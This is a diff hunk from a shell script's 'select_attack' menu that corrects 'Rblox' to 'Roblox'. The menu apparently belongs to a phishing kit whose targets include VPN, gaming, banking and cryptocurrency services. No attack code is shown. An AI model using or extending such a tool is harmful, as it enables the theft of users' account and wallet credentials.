@@ -367,7 +367,7 @@ function select_attack {
 	 ║ 13)${GR}...${B}P${W}csCard     14)${GR}...${B}N${W}26       ║
 	 ║ 15)${GR}...${B}C${W}yberGhost  16)${GR}...${B}N${W}ordVPN   ║
 	 ║ 17)${GR}...${B}E${W}xpressVPN  18)${GR}...${B}Z${W}enmate   ║
-	 ║ 19)${GR}...${B}R${W}blox       20)${GR}...${B}S${W}team     ║
+	 ║ 19)${GR}...${B}R${W}oblox      20)${GR}...${B}S${W}team     ║
 	 ║ 21)${GR}...${B}B${W}inance     22)${GR}...${B}E${W}toro     ║
 	 ║ 23)${GR}...${B}B${W}ittrex     24)${GR}...${B}C${W}oinbase  ║
          ║                                   ║
